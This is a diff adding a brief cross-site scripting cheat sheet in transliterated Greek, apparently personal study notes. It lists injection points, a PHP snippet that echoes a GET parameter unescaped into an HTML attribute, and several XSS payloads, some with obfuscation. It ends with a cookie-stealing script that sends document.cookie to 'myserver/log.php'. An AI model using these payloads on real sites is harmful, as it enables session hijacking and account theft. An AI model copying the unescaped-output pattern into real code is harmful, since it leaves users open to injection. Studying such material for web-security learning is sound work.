@@ -1,0 +1,57 @@
+## XSS
+
+Mporoume na eisagoume payload se :
+GET - POST request 
+COOKIES
+HTTP HEADERS 
+
+
+$ easy deaze 
+
+<plaintext>
+<iframe> 
+<img>
+<script>
+
+
+
+
+$ EXAMPLE CODE 
+
+<html>
+<head><title>TETS XSS</title></head>
+<body>
+<img src="avatar.gif" alt="<?= $_GET['name']
+?>">
+</body>
+</html>
+
+
+$ INJECTION
+
+<html>
+<head><title>TETS XSS</title></head>
+<body>
+<img src="avatar.gif" alt=""><script>alert('XSS')</script>">
+?>">                      "><body onloan="alert('XSS')">
+</body>                   " onload="javascript:alert('XSS')
+</html>                   " onload="alert('XSS')
+                          " onload="alert(String.fromCharCode(88,83,83))
+                          
+$ COOKIE STEALING
+
+<script>
+    var i = new Image();
+    i.src ="http://myserver/log.php?q=" +document.cookie;
+</script>
+
+
+
+
+
+
+
+
+
+
+
